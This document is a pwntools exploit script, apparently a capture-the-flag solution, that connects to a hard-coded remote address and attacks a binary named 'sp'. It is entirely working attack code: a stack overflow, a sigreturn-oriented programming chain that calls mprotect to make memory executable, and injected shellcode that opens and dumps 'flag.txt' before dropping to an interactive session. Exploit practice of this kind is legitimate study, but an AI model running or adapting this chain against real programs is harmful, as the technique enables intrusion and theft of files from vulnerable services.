from pwn import *
import sys
remote_addr = ["36.212.170.17",9999]
libc = ELF('./libc.so.6')
elf = ELF('./sp')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./sp")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 1

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

#debug()

pop_rdi = 0x4012ec
syscall = elf.plt['syscall']
sigframe = SigreturnFrame()
sigframe.rdi = 0
sigframe.rsi = 0
sigframe.rdx = 0x404300
sigframe.rcx = 0x300
sigframe.rbp = 0x404400
sigframe.rsp = 0x404300
sigframe.rip = syscall

payload = b'a' * 0x28 + p64(pop_rdi) + p64(0xf) + p64(syscall) + bytes(sigframe)
s(payload)

sigframe2 = SigreturnFrame()
sigframe2.rdi = 10
sigframe2.rsi = 0x404000
sigframe2.rdx = 0x1000
sigframe2.rcx = 7
sigframe2.rsp = 0x404410
sigframe2.rbp = 0x404500
sigframe2.rip = syscall

shellcode = shellcraft.openat(-100, 'flag.txt', 0, 0)
shellcode += shellcraft.sendfile(1, 3, 0, 50)
shellcode = asm(shellcode)

pause()
payload = p64(pop_rdi) + p64(0xf) + p64(syscall) + bytes(sigframe2) + p64(pop_rdi) + p64(0xf) + p64(syscall) + bytes(sigframe)
s(payload)

pause()
payload = p64(0x404308) + shellcode
s(payload)

shell()
